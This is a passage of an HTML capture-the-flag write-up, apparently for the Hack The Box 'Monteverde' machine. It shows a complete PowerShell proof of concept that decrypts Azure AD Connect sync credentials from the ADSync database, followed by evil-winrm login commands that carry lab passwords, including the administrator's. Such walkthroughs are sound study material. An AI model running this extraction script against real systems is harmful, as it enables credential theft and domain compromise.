+<span class="hljs-variable">VersionInfo</span>       <span class="hljs-operator">:</span> <span class="hljs-built_in">File</span><span class="hljs-operator">:</span>             <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">Microsoft</span> <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> <span class="hljs-variable">Sync</span>\<span class="hljs-variable">Bin</span>\<span class="hljs-variable">miiserver</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
+                    <span class="hljs-variable">InternalName</span><span class="hljs-operator">:</span>     <span class="hljs-variable">miiserver</span>
+                    <span class="hljs-variable">OriginalFilename</span><span class="hljs-operator">:</span> <span class="hljs-variable">miiserver</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
+                    <span class="hljs-variable">FileVersion</span><span class="hljs-operator">:</span>      <span class="hljs-number">1.1</span><span class="hljs-number">.882</span><span class="hljs-number">.0</span>
+                    <span class="hljs-variable">FileDescription</span><span class="hljs-operator">:</span>  <span class="hljs-variable">AD</span><span class="hljs-operator">-</span><span class="hljs-variable">IAM</span><span class="hljs-operator">-</span><span class="hljs-variable">HybridSync</span> <span class="hljs-variable">master</span> <span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-variable">eb4240d4</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> <span class="hljs-built_in">Connect</span> <span class="hljs-variable">synchronization</span> <span class="hljs-variable">service</span><span class="hljs-operator">.</span>
+                    <span class="hljs-built_in">Product</span><span class="hljs-operator">:</span>          <span class="hljs-variable">Microsoft</span>Â® <span class="hljs-variable">Azure</span>Â® <span class="hljs-variable">AD</span> <span class="hljs-built_in">Connect</span>
+                    <span class="hljs-variable">ProductVersion</span><span class="hljs-operator">:</span>   <span class="hljs-number">1.1</span><span class="hljs-number">.882</span><span class="hljs-number">.0</span></code></pre></div>
+<p>sqlcmd -S MONTEVERDE -Q “use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration”</p>
+<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">Function</span> <span class="hljs-title">Get-ADConnectPassword</span></span>{
+<span class="hljs-built_in">Write-Host</span> <span class="hljs-string">"AD Connect Sync Credential Extract POC (@_xpn_)`n"</span>
+<span class="hljs-variable">$key_id</span> = <span class="hljs-number">1</span>
+<span class="hljs-variable">$instance_id</span> = [<span class="hljs-type">GUID</span>]<span class="hljs-string">"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"</span>
+<span class="hljs-variable">$entropy</span> = [<span class="hljs-type">GUID</span>]<span class="hljs-string">"194EC2FC-F186-46CF-B44D-071EB61F49CD"</span>
+<span class="hljs-variable">$client</span> = <span class="hljs-built_in">new-object</span> System.Data.SqlClient.SqlConnection <span class="hljs-literal">-ArgumentList</span>
+<span class="hljs-string">"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"</span>
+<span class="hljs-variable">$client</span>.Open()
+<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()
+<span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"</span>
+<span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()
+<span class="hljs-variable">$reader</span>.Read() | <span class="hljs-built_in">Out-Null</span>
+<span class="hljs-variable">$config</span> = <span class="hljs-variable">$reader</span>.GetString(<span class="hljs-number">0</span>)
+<span class="hljs-variable">$crypted</span> = <span class="hljs-variable">$reader</span>.GetString(<span class="hljs-number">1</span>)
+<span class="hljs-variable">$reader</span>.Close()
+<span class="hljs-built_in">add-type</span> <span class="hljs-literal">-path</span> <span class="hljs-string">'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'</span>
+<span class="hljs-variable">$km</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span>
+Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+<span class="hljs-variable">$km</span>.LoadKeySet(<span class="hljs-variable">$entropy</span>, <span class="hljs-variable">$instance_id</span>, <span class="hljs-variable">$key_id</span>)
+<span class="hljs-variable">$key</span> = <span class="hljs-variable">$null</span>
+<span class="hljs-variable">$km</span>.GetActiveCredentialKey([<span class="hljs-type">ref</span>]<span class="hljs-variable">$key</span>)
+<span class="hljs-variable">$key2</span> = <span class="hljs-variable">$null</span>
+<span class="hljs-variable">$km</span>.GetKey(<span class="hljs-number">1</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$key2</span>)
+<span class="hljs-variable">$decrypted</span> = <span class="hljs-variable">$null</span>
+<span class="hljs-variable">$key2</span>.DecryptBase64ToString(<span class="hljs-variable">$crypted</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$decrypted</span>)
+<span class="hljs-variable">$domain</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$config</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">"//parameter[@name='forest-login-domain']"</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>{Name = <span class="hljs-string">'Domain'</span>; Expression = {<span class="hljs-variable">$_</span>.node.InnerXML}}
+<span class="hljs-variable">$username</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$config</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">"//parameter[@name='forest-login-user']"</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>{Name = <span class="hljs-string">'Username'</span>; Expression = {<span class="hljs-variable">$_</span>.node.InnerXML}}
+<span class="hljs-variable">$password</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$decrypted</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">"//attribute"</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>{Name =
+<span class="hljs-string">'Password'</span>; Expression = {<span class="hljs-variable">$_</span>.node.InnerXML}}
+<span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">"Domain: "</span> + <span class="hljs-variable">$domain</span>.Domain)
+<span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">"Username: "</span> + <span class="hljs-variable">$username</span>.Username)
+<span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">"Password: "</span> + <span class="hljs-variable">$password</span>.Password)
+}</code></pre></div>
+<p>evil-winrm -i 10.10.10.172 -u mhope -p “4n0therD4y@n0th3r$” -s . adconnect.ps1<br />
+adconnect.ps1<br />
+Get-ADConnectPassword</p>
+<p>evil-winrm -i 10.10.10.172 -u administrator -p ‘d0m@in4dminyeah!’</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
